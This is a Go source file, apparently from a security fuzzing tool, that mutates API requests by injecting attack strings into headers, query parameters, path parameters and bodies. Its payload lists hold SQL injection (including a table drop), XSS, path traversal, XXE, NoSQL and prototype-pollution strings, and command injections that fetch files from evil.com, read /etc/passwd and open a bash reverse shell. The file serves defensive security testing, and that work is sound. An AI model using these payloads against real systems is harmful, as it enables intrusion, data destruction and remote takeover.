/*
Author: KleaSCM
Email: KleaSCM@gmail.com
File: api_mutator.go
Description: API mutator for generating injection payloads, authentication bypass
attempts, and API-specific mutations. Provides comprehensive security testing
for web APIs, REST endpoints, GraphQL, and network protocols.
*/

package strategies

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"time"

	"github.com/kleascm/akaylee-fuzzer/pkg/interfaces"
	"github.com/sirupsen/logrus"
)

// APIMutator implements API-specific mutation strategies
type APIMutator struct {
	payloadGenerator *APIPayloadGenerator
	mutationRate     float64
	logger           *logrus.Logger
}

// APIPayloadGenerator generates various injection payloads
type APIPayloadGenerator struct {
	sqlInjectionPayloads     []string
	xssPayloads              []string
	commandInjectionPayloads []string
	pathTraversalPayloads    []string
	authBypassPayloads       []string
	rateLimitBypassPayloads  []string
	noSQLInjectionPayloads   []string
	xmlInjectionPayloads     []string
	jsonInjectionPayloads    []string
}

// NewAPIMutator creates a new API mutator
func NewAPIMutator(mutationRate float64, logger *logrus.Logger) *APIMutator {
	return &APIMutator{
		payloadGenerator: NewAPIPayloadGenerator(),
		mutationRate:     mutationRate,
		logger:           logger,
	}
}

// NewAPIPayloadGenerator creates a new payload generator
func NewAPIPayloadGenerator() *APIPayloadGenerator {
	return &APIPayloadGenerator{
		sqlInjectionPayloads:     generateSQLInjectionPayloads(),
		xssPayloads:              generateXSSPayloads(),
		commandInjectionPayloads: generateCommandInjectionPayloads(),
		pathTraversalPayloads:    generatePathTraversalPayloads(),
		authBypassPayloads:       generateAuthBypassPayloads(),
		rateLimitBypassPayloads:  generateRateLimitBypassPayloads(),
		noSQLInjectionPayloads:   generateNoSQLInjectionPayloads(),
		xmlInjectionPayloads:     generateXMLInjectionPayloads(),
		jsonInjectionPayloads:    generateJSONInjectionPayloads(),
	}
}

// MutateAPIRequest mutates an API request with various injection payloads
func (m *APIMutator) MutateAPIRequest(request *interfaces.APIRequest) (*interfaces.APIRequest, error) {
	mutated := &interfaces.APIRequest{
		ID:          generateRequestID(),
		TargetID:    request.TargetID,
		Method:      request.Method,
		URL:         request.URL,
		Headers:     make(map[string]string),
		QueryParams: make(map[string]string),
		PathParams:  make(map[string]string),
		Body:        make([]byte, len(request.Body)),
		BodyType:    request.BodyType,
		Auth:        request.Auth,
		Timeout:     request.Timeout,
		Metadata:    make(map[string]interface{}),
	}

	// Copy original data
	copy(mutated.Body, request.Body)
	for k, v := range request.Headers {
		mutated.Headers[k] = v
	}
	for k, v := range request.QueryParams {
		mutated.QueryParams[k] = v
	}
	for k, v := range request.PathParams {
		mutated.PathParams[k] = v
	}
	for k, v := range request.Metadata {
		mutated.Metadata[k] = v
	}

	// Apply mutations based on mutation rate
	if rand.Float64() < m.mutationRate {
		mutationType := rand.Intn(8)
		switch mutationType {
		case 0:
			m.mutateHeaders(mutated)
		case 1:
			m.mutateQueryParams(mutated)
		case 2:
			m.mutatePathParams(mutated)
		case 3:
			m.mutateBody(mutated)
		case 4:
			m.injectSQLPayload(mutated)
		case 5:
			m.injectXSSPayload(mutated)
		case 6:
			m.injectCommandInjectionPayload(mutated)
		case 7:
			m.injectAuthBypassPayload(mutated)
		}
	}

	mutated.Metadata["mutator"] = m.Name()
	mutated.Metadata["mutation_rate"] = m.mutationRate

	return mutated, nil
}

// MutateHeaders mutates HTTP headers
func (m *APIMutator) MutateHeaders(headers map[string]string) (map[string]string, error) {
	mutated := make(map[string]string)
	for k, v := range headers {
		mutated[k] = v
	}

	if rand.Float64() < m.mutationRate {
		// Add malicious headers
		maliciousHeaders := map[string]string{
			"X-Forwarded-For":  "127.0.0.1",
			"X-Real-IP":        "192.168.1.1",
			"X-Originating-IP": "10.0.0.1",
			"X-Remote-IP":      "172.16.0.1",
			"X-Remote-Addr":    "8.8.8.8",
			"X-Client-IP":      "1.1.1.1",
			"X-Host":           "evil.com",
			"X-Forwarded-Host": "malicious.com",
		}

		for header, value := range maliciousHeaders {
			if rand.Float64() < 0.5 {
				mutated[header] = value
			}
		}
	}

	return mutated, nil
}

// MutateQueryParams mutates query parameters
func (m *APIMutator) MutateQueryParams(params map[string]string) (map[string]string, error) {
	mutated := make(map[string]string)
	for k, v := range params {
		mutated[k] = v
	}

	if rand.Float64() < m.mutationRate {
		// Add injection payloads to random parameters
		for param := range mutated {
			if rand.Float64() < 0.3 {
				payload := m.getRandomInjectionPayload()
				mutated[param] = payload
			}
		}
	}

	return mutated, nil
}

// MutatePathParams mutates path parameters
func (m *APIMutator) MutatePathParams(params map[string]string) (map[string]string, error) {
	mutated := make(map[string]string)
	for k, v := range params {
		mutated[k] = v
	}

	if rand.Float64() < m.mutationRate {
		// Add path traversal payloads
		for param := range mutated {
			if rand.Float64() < 0.4 {
				payload := m.getRandomPathTraversalPayload()
				mutated[param] = payload
			}
		}
	}

	return mutated, nil
}

// MutateBody mutates request body
func (m *APIMutator) MutateBody(body []byte, contentType string) ([]byte, error) {
	if len(body) == 0 {
		return body, nil
	}

	if rand.Float64() < m.mutationRate {
		switch contentType {
		case "application/json":
			return m.mutateJSONBody(body)
		case "application/xml":
			return m.mutateXMLBody(body)
		case "application/x-www-form-urlencoded":
			return m.mutateFormBody(body)
		default:
			return m.mutateRawBody(body)
		}
	}

	return body, nil
}

// GenerateInjectionPayloads returns all available injection payloads
func (m *APIMutator) GenerateInjectionPayloads() []string {
	var payloads []string
	payloads = append(payloads, m.payloadGenerator.sqlInjectionPayloads...)
	payloads = append(payloads, m.payloadGenerator.xssPayloads...)
	payloads = append(payloads, m.payloadGenerator.commandInjectionPayloads...)
	payloads = append(payloads, m.payloadGenerator.pathTraversalPayloads...)
	payloads = append(payloads, m.payloadGenerator.noSQLInjectionPayloads...)
	payloads = append(payloads, m.payloadGenerator.xmlInjectionPayloads...)
	payloads = append(payloads, m.payloadGenerator.jsonInjectionPayloads...)
	return payloads
}

// GenerateAuthBypassPayloads returns authentication bypass payloads
func (m *APIMutator) GenerateAuthBypassPayloads() []string {
	return m.payloadGenerator.authBypassPayloads
}

// Mutate implements the interfaces.Mutator interface for APIMutator
func (m *APIMutator) Mutate(testCase *interfaces.TestCase) (*interfaces.TestCase, error) {
	// Try to parse the test case data as an APIRequest
	var req interfaces.APIRequest
	err := json.Unmarshal(testCase.Data, &req)
	if err != nil {
		// If not valid JSON, just mutate the raw data
		return testCase, nil
	}
	mutatedReq, err := m.MutateAPIRequest(&req)
	if err != nil {
		return testCase, err
	}
	mutatedData, err := json.Marshal(mutatedReq)
	if err != nil {
		return testCase, err
	}
	mutated := &interfaces.TestCase{
		ID:         testCase.ID + "_api_mutated",
		Data:       mutatedData,
		ParentID:   testCase.ID,
		Generation: testCase.Generation + 1,
		CreatedAt:  time.Now(),
		Priority:   testCase.Priority,
		Metadata:   map[string]interface{}{"mutator": m.Name()},
	}
	return mutated, nil
}

// Helper methods for specific mutations

func (m *APIMutator) mutateHeaders(request *interfaces.APIRequest) {
	request.Headers, _ = m.MutateHeaders(request.Headers)
}

func (m *APIMutator) mutateQueryParams(request *interfaces.APIRequest) {
	request.QueryParams, _ = m.MutateQueryParams(request.QueryParams)
}

func (m *APIMutator) mutatePathParams(request *interfaces.APIRequest) {
	request.PathParams, _ = m.MutatePathParams(request.PathParams)
}

func (m *APIMutator) mutateBody(request *interfaces.APIRequest) {
	request.Body, _ = m.MutateBody(request.Body, request.BodyType)
}

func (m *APIMutator) injectSQLPayload(request *interfaces.APIRequest) {
	payload := m.getRandomSQLInjectionPayload()

	// Inject into query parameters
	for param := range request.QueryParams {
		request.QueryParams[param] = payload
		break
	}
}

func (m *APIMutator) injectXSSPayload(request *interfaces.APIRequest) {
	// Inject into body if it's JSON
	if request.BodyType == "application/json" {
		request.Body = m.injectIntoJSON(request.Body)
	}
}

func (m *APIMutator) injectCommandInjectionPayload(request *interfaces.APIRequest) {
	payload := m.getRandomCommandInjectionPayload()

	// Inject into query parameters
	for param := range request.QueryParams {
		request.QueryParams[param] = payload
		break
	}
}

func (m *APIMutator) injectAuthBypassPayload(request *interfaces.APIRequest) {
	payload := m.getRandomAuthBypassPayload()

	// Inject into headers
	request.Headers["Authorization"] = payload
}

// Helper methods for getting random payloads

func (m *APIMutator) getRandomInjectionPayload() string {
	allPayloads := m.GenerateInjectionPayloads()
	if len(allPayloads) == 0 {
		return "test"
	}
	return allPayloads[rand.Intn(len(allPayloads))]
}

func (m *APIMutator) getRandomSQLInjectionPayload() string {
	if len(m.payloadGenerator.sqlInjectionPayloads) == 0 {
		return "' OR 1=1 --"
	}
	return m.payloadGenerator.sqlInjectionPayloads[rand.Intn(len(m.payloadGenerator.sqlInjectionPayloads))]
}

func (m *APIMutator) getRandomXSSPayload() string {
	if len(m.payloadGenerator.xssPayloads) == 0 {
		return "<script>alert('xss')</script>"
	}
	return m.payloadGenerator.xssPayloads[rand.Intn(len(m.payloadGenerator.xssPayloads))]
}

func (m *APIMutator) getRandomCommandInjectionPayload() string {
	if len(m.payloadGenerator.commandInjectionPayloads) == 0 {
		return "; ls -la"
	}
	return m.payloadGenerator.commandInjectionPayloads[rand.Intn(len(m.payloadGenerator.commandInjectionPayloads))]
}

func (m *APIMutator) getRandomPathTraversalPayload() string {
	if len(m.payloadGenerator.pathTraversalPayloads) == 0 {
		return "../../../etc/passwd"
	}
	return m.payloadGenerator.pathTraversalPayloads[rand.Intn(len(m.payloadGenerator.pathTraversalPayloads))]
}

func (m *APIMutator) getRandomAuthBypassPayload() string {
	if len(m.payloadGenerator.authBypassPayloads) == 0 {
		return "Bearer null"
	}
	return m.payloadGenerator.authBypassPayloads[rand.Intn(len(m.payloadGenerator.authBypassPayloads))]
}

// Body mutation helpers

func (m *APIMutator) mutateJSONBody(body []byte) ([]byte, error) {
	var data interface{}
	if err := json.Unmarshal(body, &data); err != nil {
		return body, nil
	}

	// Inject payloads into JSON values
	m.injectIntoJSONValue(data)

	return json.Marshal(data)
}

func (m *APIMutator) mutateXMLBody(body []byte) ([]byte, error) {
	// Simple XML injection
	payload := m.payloadGenerator.xmlInjectionPayloads[rand.Intn(len(m.payloadGenerator.xmlInjectionPayloads))]
	return []byte(fmt.Sprintf("%s%s", string(body), payload)), nil
}

func (m *APIMutator) mutateFormBody(body []byte) ([]byte, error) {
	// Simple form injection
	payload := m.getRandomInjectionPayload()
	return []byte(fmt.Sprintf("%s&injected=%s", string(body), payload)), nil
}

func (m *APIMutator) mutateRawBody(body []byte) ([]byte, error) {
	// Simple raw body injection
	payload := m.getRandomInjectionPayload()
	return []byte(fmt.Sprintf("%s%s", string(body), payload)), nil
}

func (m *APIMutator) injectIntoJSON(data interface{}) []byte {
	m.injectIntoJSONValue(data)
	result, _ := json.Marshal(data)
	return result
}

func (m *APIMutator) injectIntoJSONValue(data interface{}) {
	switch v := data.(type) {
	case map[string]interface{}:
		for key, value := range v {
			if rand.Float64() < 0.3 {
				v[key] = m.getRandomInjectionPayload()
			} else {
				m.injectIntoJSONValue(value)
			}
		}
	case []interface{}:
		for i, value := range v {
			if rand.Float64() < 0.3 {
				v[i] = m.getRandomInjectionPayload()
			} else {
				m.injectIntoJSONValue(value)
			}
		}
	case string:
		if rand.Float64() < 0.5 {
			data = m.getRandomInjectionPayload()
		}
	}
}

// Payload generation functions

func generateSQLInjectionPayloads() []string {
	return []string{
		"' OR 1=1 --",
		"' OR '1'='1",
		"'; DROP TABLE users; --",
		"' UNION SELECT * FROM users --",
		"' AND 1=CONVERT(int,@@version) --",
		"' WAITFOR DELAY '00:00:05' --",
		"' OR 1=1#",
		"' OR 1=1/*",
		"admin' --",
		"admin' #",
		"admin'/*",
		"' OR 'x'='x",
		"' OR 1=1 LIMIT 1 --",
		"' OR 1=1 ORDER BY 1 --",
		"' OR 1=1 GROUP BY 1 --",
	}
}

func generateXSSPayloads() []string {
	return []string{
		"<script>alert('xss')</script>",
		"<img src=x onerror=alert('xss')>",
		"<svg onload=alert('xss')>",
		"javascript:alert('xss')",
		"<iframe src=javascript:alert('xss')>",
		"<body onload=alert('xss')>",
		"<input onfocus=alert('xss') autofocus>",
		"<select onchange=alert('xss')>",
		"<textarea onblur=alert('xss')>",
		"<marquee onstart=alert('xss')>",
		"<details ontoggle=alert('xss')>",
		"<video onloadstart=alert('xss')>",
		"<audio oncanplay=alert('xss')>",
		"<embed src=javascript:alert('xss')>",
		"<object data=javascript:alert('xss')>",
	}
}

func generateCommandInjectionPayloads() []string {
	return []string{
		"; ls -la",
		"| whoami",
		"& cat /etc/passwd",
		"`id`",
		"$(whoami)",
		"; pwd",
		"| uname -a",
		"& ps aux",
		"`ls -la`",
		"$(cat /etc/passwd)",
		"; netstat -an",
		"| wget http://evil.com/shell",
		"& curl http://evil.com/shell",
		"`nc -l 4444`",
		"$(bash -i >& /dev/tcp/evil.com/4444 0>&1)",
	}
}

func generatePathTraversalPayloads() []string {
	return []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
		"....//....//....//etc/passwd",
		"..%2F..%2F..%2Fetc%2Fpasswd",
		"..%252F..%252F..%252Fetc%252Fpasswd",
		"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
		"..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts",
		"..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
		"..%xff..%xff..%xffetc%xffpasswd",
		"..%c1%9c..%c1%9c..%c1%9cwindows%c1%9csystem32%c1%9cdrivers%c1%9cetc%c1%9chosts",
	}
}

func generateAuthBypassPayloads() []string {
	return []string{
		"Bearer null",
		"Bearer undefined",
		"Bearer 0",
		"Bearer false",
		"Bearer true",
		"Bearer admin",
		"Bearer root",
		"Bearer guest",
		"Bearer anonymous",
		"Bearer test",
		"Bearer dummy",
		"Bearer fake",
		"Bearer invalid",
		"Bearer expired",
		"Bearer revoked",
	}
}

func generateRateLimitBypassPayloads() []string {
	return []string{
		"X-Forwarded-For: 127.0.0.1",
		"X-Real-IP: 192.168.1.1",
		"X-Originating-IP: 10.0.0.1",
		"X-Remote-IP: 172.16.0.1",
		"X-Remote-Addr: 8.8.8.8",
		"X-Client-IP: 1.1.1.1",
		"X-Host: localhost",
		"X-Forwarded-Host: localhost",
	}
}

func generateNoSQLInjectionPayloads() []string {
	return []string{
		`{"$ne": null}`,
		`{"$gt": ""}`,
		`{"$lt": ""}`,
		`{"$regex": ".*"}`,
		`{"$where": "1==1"}`,
		`{"$exists": true}`,
		`{"$type": 2}`,
		`{"$in": ["admin", "root"]}`,
		`{"$nin": []}`,
		`{"$all": []}`,
	}
}

func generateXMLInjectionPayloads() []string {
	return []string{
		"<![CDATA[<script>alert('xss')</script>]]>",
		"<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><test>&xxe;</test>",
		"<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"http://evil.com/evil.dtd\">]><test>&xxe;</test>",
		"<![CDATA[<script>alert('xss')</script>]]>",
		"<?xml version=\"1.0\"?><test><![CDATA[<script>alert('xss')</script>]]></test>",
	}
}

func generateJSONInjectionPayloads() []string {
	return []string{
		`{"__proto__": {"admin": true}}`,
		`{"constructor": {"prototype": {"admin": true}}}`,
		`{"__proto__": {"isAdmin": true}}`,
		`{"constructor": {"prototype": {"isAdmin": true}}}`,
		`{"__proto__": {"role": "admin"}}`,
		`{"constructor": {"prototype": {"role": "admin"}}}`,
	}
}

// Utility functions

func generateRequestID() string {
	return fmt.Sprintf("req_%d", time.Now().UnixNano())
}

// Name returns the name of this mutator
func (m *APIMutator) Name() string {
	return "APIMutator"
}

// Description returns a description of this mutator
func (m *APIMutator) Description() string {
	return "Generates API-specific mutations including injection payloads, authentication bypass attempts, and protocol-specific attacks"
}
